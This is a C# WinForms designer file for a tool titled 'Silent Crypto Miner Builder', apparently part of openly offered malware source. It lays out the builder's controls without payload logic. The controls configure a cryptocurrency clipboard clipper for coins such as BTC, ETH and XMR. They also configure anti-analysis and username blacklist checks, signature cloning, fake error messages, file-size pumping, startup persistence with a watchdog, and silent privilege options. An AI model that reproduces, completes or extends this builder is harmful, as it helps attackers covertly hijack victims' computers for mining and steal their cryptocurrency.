            this.txtPumpSize.TabIndex = 152;
            this.txtPumpSize.Text = "0";
            this.txtPumpSize.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPumpSize.UseSystemPasswordChar = false;
            this.txtPumpSize.WordWrap = false;
            // 
            // label3
            // 
            this.label3.AutoEllipsis = true;
            this.label3.BackColor = System.Drawing.Color.Transparent;
            this.label3.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.label3.ForeColor = System.Drawing.Color.Gray;
            this.label3.Location = new System.Drawing.Point(9, 77);
            this.label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(162, 17);
            this.label3.TabIndex = 151;
            this.label3.Text = "Pump Size (MB)";
            // 
            // chkIcon
            // 
            this.chkIcon.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkIcon.BackColor = System.Drawing.Color.Transparent;
            this.chkIcon.Checked = false;
            this.chkIcon.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkIcon.ForeColor = System.Drawing.Color.Black;
            this.chkIcon.Location = new System.Drawing.Point(239, 12);
            this.chkIcon.Margin = new System.Windows.Forms.Padding(2);
            this.chkIcon.Name = "chkIcon";
            this.chkIcon.Size = new System.Drawing.Size(111, 24);
            this.chkIcon.TabIndex = 144;
            this.chkIcon.Text = "Custom Icon";
            this.chkIcon.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkIcon_CheckedChanged);
            // 
            // picIcon
            // 
            this.picIcon.ErrorImage = null;
            this.picIcon.Image = global::StackMiner.Properties.Resources.icon1;
            this.picIcon.InitialImage = null;
            this.picIcon.Location = new System.Drawing.Point(239, 104);
            this.picIcon.Margin = new System.Windows.Forms.Padding(2);
            this.picIcon.Name = "picIcon";
            this.picIcon.Size = new System.Drawing.Size(168, 77);
            this.picIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.picIcon.TabIndex = 143;
            this.picIcon.TabStop = false;
            // 
            // btnIconBrowse
            // 
            this.btnIconBrowse.BackColor = System.Drawing.Color.Transparent;
            this.btnIconBrowse.Enabled = false;
            this.btnIconBrowse.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnIconBrowse.Location = new System.Drawing.Point(239, 72);
            this.btnIconBrowse.Margin = new System.Windows.Forms.Padding(2);
            this.btnIconBrowse.Name = "btnIconBrowse";
            this.btnIconBrowse.Size = new System.Drawing.Size(168, 25);
            this.btnIconBrowse.TabIndex = 141;
            this.btnIconBrowse.Text = "Browse";
            this.btnIconBrowse.Click += new System.EventHandler(this.btnIconBrowse_Click);
            // 
            // txtIconPath
            // 
            this.txtIconPath.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtIconPath.Enabled = false;
            this.txtIconPath.ForeColor = System.Drawing.Color.Silver;
            this.txtIconPath.Location = new System.Drawing.Point(239, 43);
            this.txtIconPath.Margin = new System.Windows.Forms.Padding(2);
            this.txtIconPath.MaxLength = 32767;
            this.txtIconPath.MultiLine = false;
            this.txtIconPath.Name = "txtIconPath";
            this.txtIconPath.ReadOnly = false;
            this.txtIconPath.Size = new System.Drawing.Size(168, 24);
            this.txtIconPath.TabIndex = 142;
            this.txtIconPath.Text = "Path to icon...";
            this.txtIconPath.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtIconPath.UseSystemPasswordChar = false;
            this.txtIconPath.WordWrap = false;
            // 
            // btnAdvancedOptions
            // 
            this.btnAdvancedOptions.BackColor = System.Drawing.Color.Transparent;
            this.btnAdvancedOptions.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnAdvancedOptions.Location = new System.Drawing.Point(12, 157);
            this.btnAdvancedOptions.Margin = new System.Windows.Forms.Padding(2);
            this.btnAdvancedOptions.Name = "btnAdvancedOptions";
            this.btnAdvancedOptions.Size = new System.Drawing.Size(213, 24);
            this.btnAdvancedOptions.TabIndex = 140;
            this.btnAdvancedOptions.Text = "Administrator Features";
            this.btnAdvancedOptions.Click += new System.EventHandler(this.btnAdvancedOptions_Click);
            // 
            // labelDisableSleep
            // 
            this.labelDisableSleep.AutoEllipsis = true;
            this.labelDisableSleep.BackColor = System.Drawing.Color.Transparent;
            this.labelDisableSleep.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelDisableSleep.ForeColor = System.Drawing.Color.Gray;
            this.labelDisableSleep.Location = new System.Drawing.Point(9, 45);
            this.labelDisableSleep.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelDisableSleep.Name = "labelDisableSleep";
            this.labelDisableSleep.Size = new System.Drawing.Size(162, 17);
            this.labelDisableSleep.TabIndex = 109;
            this.labelDisableSleep.Text = "Disable Sleep";
            // 
            // toggleDisableSleep
            // 
            this.toggleDisableSleep.BackColor = System.Drawing.Color.Transparent;
            this.toggleDisableSleep.Checked = true;
            this.toggleDisableSleep.ForeColor = System.Drawing.Color.Black;
            this.toggleDisableSleep.Location = new System.Drawing.Point(175, 42);
            this.toggleDisableSleep.Margin = new System.Windows.Forms.Padding(2);
            this.toggleDisableSleep.Name = "toggleDisableSleep";
            this.toggleDisableSleep.Size = new System.Drawing.Size(50, 24);
            this.toggleDisableSleep.TabIndex = 108;
            // 
            // labelOptionAdministrator
            // 
            this.labelOptionAdministrator.AutoEllipsis = true;
            this.labelOptionAdministrator.BackColor = System.Drawing.Color.Transparent;
            this.labelOptionAdministrator.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelOptionAdministrator.ForeColor = System.Drawing.Color.Gray;
            this.labelOptionAdministrator.Location = new System.Drawing.Point(9, 130);
            this.labelOptionAdministrator.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelOptionAdministrator.Name = "labelOptionAdministrator";
            this.labelOptionAdministrator.Size = new System.Drawing.Size(162, 17);
            this.labelOptionAdministrator.TabIndex = 99;
            this.labelOptionAdministrator.Text = "Run as Administrator";
            // 
            // toggleAdministrator
            // 
            this.toggleAdministrator.BackColor = System.Drawing.Color.Transparent;
            this.toggleAdministrator.Checked = false;
            this.toggleAdministrator.ForeColor = System.Drawing.Color.Black;
            this.toggleAdministrator.Location = new System.Drawing.Point(175, 127);
            this.toggleAdministrator.Margin = new System.Windows.Forms.Padding(2);
            this.toggleAdministrator.Name = "toggleAdministrator";
            this.toggleAdministrator.Size = new System.Drawing.Size(50, 24);
            this.toggleAdministrator.TabIndex = 98;
            this.toggleAdministrator.CheckedChanged += new MephToggleSwitch.CheckedChangedEventHandler(this.toggleAdministrator_CheckedChanged);
            // 
            // tabExtra
            // 
            this.tabExtra.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabExtra.Controls.Add(this.txtFakeErrorTitle);
            this.tabExtra.Controls.Add(this.btnSignatureBrowse);
            this.tabExtra.Controls.Add(this.txtSignaturePath);
            this.tabExtra.Controls.Add(this.chkSignature);
            this.tabExtra.Controls.Add(this.txtFakeErrorText);
            this.tabExtra.Controls.Add(this.chkFakeError);
            this.tabExtra.Controls.Add(this.chkAntiUsername);
            this.tabExtra.Controls.Add(this.txtAntiUsername);
            this.tabExtra.Location = new System.Drawing.Point(89, 4);
            this.tabExtra.Margin = new System.Windows.Forms.Padding(0);
            this.tabExtra.Name = "tabExtra";
            this.tabExtra.Size = new System.Drawing.Size(418, 190);
            this.tabExtra.TabIndex = 6;
            this.tabExtra.Text = "Extra";
            // 
            // txtFakeErrorTitle
            // 
            this.txtFakeErrorTitle.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtFakeErrorTitle.Enabled = false;
            this.txtFakeErrorTitle.ForeColor = System.Drawing.Color.Silver;
            this.txtFakeErrorTitle.Location = new System.Drawing.Point(12, 49);
            this.txtFakeErrorTitle.Margin = new System.Windows.Forms.Padding(2);
            this.txtFakeErrorTitle.MaxLength = 32767;
            this.txtFakeErrorTitle.MultiLine = false;
            this.txtFakeErrorTitle.Name = "txtFakeErrorTitle";
            this.txtFakeErrorTitle.ReadOnly = false;
            this.txtFakeErrorTitle.Size = new System.Drawing.Size(191, 24);
            this.txtFakeErrorTitle.TabIndex = 166;
            this.txtFakeErrorTitle.Text = "Title";
            this.txtFakeErrorTitle.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtFakeErrorTitle.UseSystemPasswordChar = false;
            this.txtFakeErrorTitle.WordWrap = false;
            // 
            // btnSignatureBrowse
            // 
            this.btnSignatureBrowse.BackColor = System.Drawing.Color.Transparent;
            this.btnSignatureBrowse.Enabled = false;
            this.btnSignatureBrowse.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnSignatureBrowse.Location = new System.Drawing.Point(211, 82);
            this.btnSignatureBrowse.Margin = new System.Windows.Forms.Padding(2);
            this.btnSignatureBrowse.Name = "btnSignatureBrowse";
            this.btnSignatureBrowse.Size = new System.Drawing.Size(193, 24);
            this.btnSignatureBrowse.TabIndex = 163;
            this.btnSignatureBrowse.Text = "Browse";
            // 
            // txtSignaturePath
            // 
            this.txtSignaturePath.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtSignaturePath.Enabled = false;
            this.txtSignaturePath.ForeColor = System.Drawing.Color.Silver;
            this.txtSignaturePath.Location = new System.Drawing.Point(211, 49);
            this.txtSignaturePath.Margin = new System.Windows.Forms.Padding(2);
            this.txtSignaturePath.MaxLength = 32767;
            this.txtSignaturePath.MultiLine = false;
            this.txtSignaturePath.Name = "txtSignaturePath";
            this.txtSignaturePath.ReadOnly = false;
            this.txtSignaturePath.Size = new System.Drawing.Size(193, 24);
            this.txtSignaturePath.TabIndex = 164;
            this.txtSignaturePath.Text = "Path to executable to clone...";
            this.txtSignaturePath.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtSignaturePath.UseSystemPasswordChar = false;
            this.txtSignaturePath.WordWrap = false;
            // 
            // chkSignature
            // 
            this.chkSignature.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkSignature.BackColor = System.Drawing.Color.Transparent;
            this.chkSignature.Checked = false;
            this.chkSignature.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkSignature.ForeColor = System.Drawing.Color.Black;
            this.chkSignature.Location = new System.Drawing.Point(211, 15);
            this.chkSignature.Margin = new System.Windows.Forms.Padding(2);
            this.chkSignature.Name = "chkSignature";
            this.chkSignature.Size = new System.Drawing.Size(193, 24);
            this.chkSignature.TabIndex = 162;
            this.chkSignature.Text = "Clone Signature";
            this.chkSignature.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkSignature_CheckedChanged);
            // 
            // txtFakeErrorText
            // 
            this.txtFakeErrorText.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtFakeErrorText.Enabled = false;
            this.txtFakeErrorText.ForeColor = System.Drawing.Color.Silver;
            this.txtFakeErrorText.Location = new System.Drawing.Point(12, 82);
            this.txtFakeErrorText.Margin = new System.Windows.Forms.Padding(2);
            this.txtFakeErrorText.MaxLength = 32767;
            this.txtFakeErrorText.MultiLine = false;
            this.txtFakeErrorText.Name = "txtFakeErrorText";
            this.txtFakeErrorText.ReadOnly = false;
            this.txtFakeErrorText.Size = new System.Drawing.Size(191, 24);
            this.txtFakeErrorText.TabIndex = 161;
            this.txtFakeErrorText.Text = "Text";
            this.txtFakeErrorText.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtFakeErrorText.UseSystemPasswordChar = false;
            this.txtFakeErrorText.WordWrap = false;
            // 
            // chkFakeError
            // 
            this.chkFakeError.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkFakeError.BackColor = System.Drawing.Color.Transparent;
            this.chkFakeError.Checked = false;
            this.chkFakeError.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkFakeError.ForeColor = System.Drawing.Color.Black;
            this.chkFakeError.Location = new System.Drawing.Point(12, 15);
            this.chkFakeError.Margin = new System.Windows.Forms.Padding(2);
            this.chkFakeError.Name = "chkFakeError";
            this.chkFakeError.Size = new System.Drawing.Size(170, 24);
            this.chkFakeError.TabIndex = 160;
            this.chkFakeError.Text = "Fake Error";
            this.chkFakeError.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkFakeError_CheckedChanged);
            // 
            // chkAntiUsername
            // 
            this.chkAntiUsername.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkAntiUsername.BackColor = System.Drawing.Color.Transparent;
            this.chkAntiUsername.Checked = true;
            this.chkAntiUsername.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkAntiUsername.ForeColor = System.Drawing.Color.Black;
            this.chkAntiUsername.Location = new System.Drawing.Point(12, 125);
            this.chkAntiUsername.Margin = new System.Windows.Forms.Padding(2);
            this.chkAntiUsername.Name = "chkAntiUsername";
            this.chkAntiUsername.Size = new System.Drawing.Size(237, 24);
            this.chkAntiUsername.TabIndex = 153;
            this.chkAntiUsername.Text = "Blacklisted Usernames";
            this.chkAntiUsername.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkAntiUsername_CheckedChanged);
            // 
            // txtAntiUsername
            // 
            this.txtAntiUsername.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAntiUsername.ForeColor = System.Drawing.Color.Silver;
            this.txtAntiUsername.Location = new System.Drawing.Point(12, 156);
            this.txtAntiUsername.Margin = new System.Windows.Forms.Padding(2);
            this.txtAntiUsername.MaxLength = 32767;
            this.txtAntiUsername.MultiLine = false;
            this.txtAntiUsername.Name = "txtAntiUsername";
            this.txtAntiUsername.ReadOnly = false;
            this.txtAntiUsername.Size = new System.Drawing.Size(392, 24);
            this.txtAntiUsername.TabIndex = 152;
            this.txtAntiUsername.Text = resources.GetString("txtAntiUsername.Text");
            this.txtAntiUsername.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAntiUsername.UseSystemPasswordChar = false;
            this.txtAntiUsername.WordWrap = false;
            // 
            // tabBuild
            // 
            this.tabBuild.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.tabBuild.Controls.Add(this.linkTelegram);
            this.tabBuild.Controls.Add(this.linkStackGithub);
            this.tabBuild.Controls.Add(this.labelSeconds);
            this.tabBuild.Controls.Add(this.labelGitHub);
            this.tabBuild.Controls.Add(this.labelStartDelay);
            this.tabBuild.Controls.Add(this.txtStartDelay);
            this.tabBuild.Controls.Add(this.txtLog);
            this.tabBuild.Controls.Add(this.btnBuild);
            this.tabBuild.Location = new System.Drawing.Point(89, 4);
            this.tabBuild.Margin = new System.Windows.Forms.Padding(0);
            this.tabBuild.Name = "tabBuild";
            this.tabBuild.Size = new System.Drawing.Size(418, 190);
            this.tabBuild.TabIndex = 4;
            this.tabBuild.Text = "Build";
            // 
            // linkTelegram
            // 
            this.linkTelegram.AutoSize = true;
            this.linkTelegram.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(17)))), ((int)(((byte)(136)))), ((int)(((byte)(195)))));
            this.linkTelegram.Location = new System.Drawing.Point(10, 164);
            this.linkTelegram.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.linkTelegram.Name = "linkTelegram";
            this.linkTelegram.Size = new System.Drawing.Size(62, 17);
            this.linkTelegram.TabIndex = 59;
            this.linkTelegram.TabStop = true;
            this.linkTelegram.Text = "Telegram";
            this.linkTelegram.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkTelegram_LinkClicked);
            // 
            // linkStackGithub
            // 
            this.linkStackGithub.AutoSize = true;
            this.linkStackGithub.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(198)))), ((int)(((byte)(198)))), ((int)(((byte)(198)))));
            this.linkStackGithub.Location = new System.Drawing.Point(82, 164);
            this.linkStackGithub.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.linkStackGithub.Name = "linkStackGithub";
            this.linkStackGithub.Size = new System.Drawing.Size(48, 17);
            this.linkStackGithub.TabIndex = 58;
            this.linkStackGithub.TabStop = true;
            this.linkStackGithub.Text = "GitHub";
            this.linkStackGithub.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.linkStackGithub_LinkClicked);
            // 
            // labelSeconds
            // 
            this.labelSeconds.AutoSize = true;
            this.labelSeconds.BackColor = System.Drawing.Color.Transparent;
            this.labelSeconds.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelSeconds.Location = new System.Drawing.Point(125, 11);
            this.labelSeconds.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelSeconds.Name = "labelSeconds";
            this.labelSeconds.Size = new System.Drawing.Size(57, 17);
            this.labelSeconds.TabIndex = 57;
            this.labelSeconds.Text = "Seconds";
            // 
            // labelGitHub
            // 
            this.labelGitHub.AutoSize = true;
            this.labelGitHub.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(198)))), ((int)(((byte)(198)))), ((int)(((byte)(198)))));
            this.labelGitHub.Location = new System.Drawing.Point(312, 164);
            this.labelGitHub.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelGitHub.Name = "labelGitHub";
            this.labelGitHub.Size = new System.Drawing.Size(95, 17);
            this.labelGitHub.TabIndex = 21;
            this.labelGitHub.TabStop = true;
            this.labelGitHub.Text = "Unam\'s GitHub";
            this.labelGitHub.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.labelGitHub_LinkClicked);
            // 
            // labelStartDelay
            // 
            this.labelStartDelay.AutoEllipsis = true;
            this.labelStartDelay.BackColor = System.Drawing.Color.Transparent;
            this.labelStartDelay.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelStartDelay.Location = new System.Drawing.Point(10, 11);
            this.labelStartDelay.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartDelay.Name = "labelStartDelay";
            this.labelStartDelay.Size = new System.Drawing.Size(74, 17);
            this.labelStartDelay.TabIndex = 56;
            this.labelStartDelay.Text = "Start Delay";
            // 
            // txtStartDelay
            // 
            this.txtStartDelay.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtStartDelay.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtStartDelay.ForeColor = System.Drawing.Color.Silver;
            this.txtStartDelay.Location = new System.Drawing.Point(87, 9);
            this.txtStartDelay.MaxLength = 32767;
            this.txtStartDelay.MultiLine = false;
            this.txtStartDelay.Name = "txtStartDelay";
            this.txtStartDelay.ReadOnly = false;
            this.txtStartDelay.Size = new System.Drawing.Size(34, 24);
            this.txtStartDelay.TabIndex = 55;
            this.txtStartDelay.Text = "45";
            this.txtStartDelay.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtStartDelay.UseSystemPasswordChar = false;
            this.txtStartDelay.WordWrap = false;
            // 
            // txtLog
            // 
            this.txtLog.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtLog.Font = new System.Drawing.Font("Segoe UI", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtLog.ForeColor = System.Drawing.Color.Silver;
            this.txtLog.Location = new System.Drawing.Point(10, 41);
            this.txtLog.Margin = new System.Windows.Forms.Padding(2);
            this.txtLog.MaxLength = 32767;
            this.txtLog.MultiLine = true;
            this.txtLog.Name = "txtLog";
            this.txtLog.ReadOnly = true;
            this.txtLog.Size = new System.Drawing.Size(399, 119);
            this.txtLog.TabIndex = 18;
            this.txtLog.Text = "Output...";
            this.txtLog.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtLog.UseSystemPasswordChar = false;
            this.txtLog.WordWrap = false;
            // 
            // btnBuild
            // 
            this.btnBuild.BackColor = System.Drawing.Color.Transparent;
            this.btnBuild.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnBuild.Location = new System.Drawing.Point(309, 8);
            this.btnBuild.Margin = new System.Windows.Forms.Padding(2);
            this.btnBuild.Name = "btnBuild";
            this.btnBuild.Size = new System.Drawing.Size(100, 25);
            this.btnBuild.TabIndex = 17;
            this.btnBuild.Text = "Build";
            this.btnBuild.Click += new System.EventHandler(this.btnBuild_Click);
            // 
            // Builder
            // 
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None;
            this.ClientSize = new System.Drawing.Size(535, 272);
            this.Controls.Add(this.formBuilder);
            this.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Margin = new System.Windows.Forms.Padding(2);
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(535, 272);
            this.MinimizeBox = false;
            this.MinimumSize = new System.Drawing.Size(535, 272);
            this.Name = "Builder";
            this.Opacity = 0.95D;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Silent Crypto Miner Builder";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.Load += new System.EventHandler(this.Form1_Load);
            this.formBuilder.ResumeLayout(false);
            this.tabcontrolBuilder.ResumeLayout(false);
            this.tabMain.ResumeLayout(false);
            this.tabMain.PerformLayout();
            this.tabStartup.ResumeLayout(false);
            this.tabAssembly.ResumeLayout(false);
            this.tabClipper.ResumeLayout(false);
            this.tabOptions.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.picIcon)).EndInit();
            this.tabExtra.ResumeLayout(false);
            this.tabBuild.ResumeLayout(false);
            this.tabBuild.PerformLayout();
            this.ResumeLayout(false);

        }

        internal MephTheme formBuilder;
        internal System.ComponentModel.BackgroundWorker workerBuild;
        internal MephButton btnAssemblyRandom;
        internal MephButton btnAssemblyClone;
        internal MephTextBox txtAssemblyVersion4;
        internal MephTextBox txtAssemblyVersion3;
        internal MephTextBox txtAssemblyVersion2;
        internal MephTextBox txtAssemblyVersion1;
        internal MephTextBox txtAssemblyTrademark;
        internal MephTextBox txtAssemblyCompany;
        internal MephTextBox txtAssemblyCopyright;
        internal MephTextBox txtAssemblyDescription;
        internal MephTextBox txtAssemblyProduct;
        internal MephTextBox txtAssemblyTitle;
        internal MephTextBox txtStartupEntryName;
        internal Label labelStartupEntryName;
        internal Label labelStartupSavePath;
        internal MephComboBox txtStartupPath;
        internal MephCheckBox chkAssembly;
        internal MephCheckBox chkStartup;
        internal MephTabcontrol tabcontrolBuilder;
        internal TabPage tabMain;
        internal TabPage tabStartup;
        internal TabPage tabAssembly;
        internal TabPage tabClipper;
        internal TabPage tabBuild;
        internal MephTextBox txtLog;
        internal MephButton btnBuild;
        internal Label labelAssemblyVersion;
        internal LinkLabel labelGitHub;
        internal Label labelSeconds;
        internal Label labelStartDelay;
        internal MephTextBox txtStartDelay;
        internal Label labelStartupWatchdog;
        internal MephToggleSwitch toggleWatchdog;
        internal Label labelHelp;
        internal LinkLabel labelWiki;
        internal MephButton btnMinerRemove;
        internal MephButton btnMinerEdit;
        internal MephButton btnMinerAdd;
        internal Label labelMiners;
        internal TabPage tabOptions;
        internal Label labelOptionAdministrator;
        internal MephToggleSwitch toggleAdministrator;
        internal MephButton btnLoadState;
        internal MephButton btnSaveState;
        internal Label labelLang;
        internal MephComboBox comboLanguage;
        internal Label labelDisableSleep;
        internal MephToggleSwitch toggleDisableSleep;
        internal Label labelStartupAutoDelete;
        internal MephToggleSwitch toggleAutoDelete;
        internal MephTextBox txtStartupFileName;
        internal Label labelStartupFileName;
        internal MephButton btnAdvancedOptions;
        internal MephListBox listMiners;
        internal TabPage tabExtra;
        internal MephButton btnStartupFileNameRandomize;
        internal MephButton btnStartupEntryNameRandomize;
        internal MephCheckBox chkIcon;
        internal PictureBox picIcon;
        internal MephButton btnIconBrowse;
        internal MephTextBox txtClipperXMR;
        internal MephTextBox txtClipperXLM;
        internal MephCheckBox chkClipper;
        internal MephTextBox txtClipperBTC;
        internal MephTextBox txtClipperBCH;
        internal MephTextBox txtClipperETH;
        internal MephTextBox txtClipperDOGE;
        internal MephTextBox txtClipperLTC;
        internal MephTextBox txtClipperDASH;
        internal MephTextBox txtIconPath;
        internal LinkLabel linkStackGithub;
        internal MephCheckBox chkAntiUsername;
        internal MephTextBox txtAntiUsername;
        internal MephTextBox txtPumpSize;
        internal Label label3;
        internal Label labelAntiAnalysis;
        internal MephToggleSwitch chkAntiAnalysis;
        internal MephTextBox txtSignatureData;
        internal MephTextBox txtFakeErrorText;
        internal MephCheckBox chkFakeError;
        internal MephButton btnSignatureBrowse;
        internal MephTextBox txtSignaturePath;
        internal MephCheckBox chkSignature;
        internal MephTextBox txtFakeErrorTitle;
        internal MephToggleSwitch chkClipperXLM;
        internal MephToggleSwitch chkClipperDASH;
        internal MephToggleSwitch chkClipperDOGE;
        internal MephToggleSwitch chkClipperBCH;
        internal MephToggleSwitch chkClipperXMR;
        internal MephToggleSwitch chkClipperLTC;
        internal MephToggleSwitch chkClipperETH;
        internal MephToggleSwitch chkClipperBTC;
        internal Label labelAdvancedOptionRunInstall;
        internal MephToggleSwitch toggleRunInstall;
        internal LinkLabel linkTelegram;
    }
}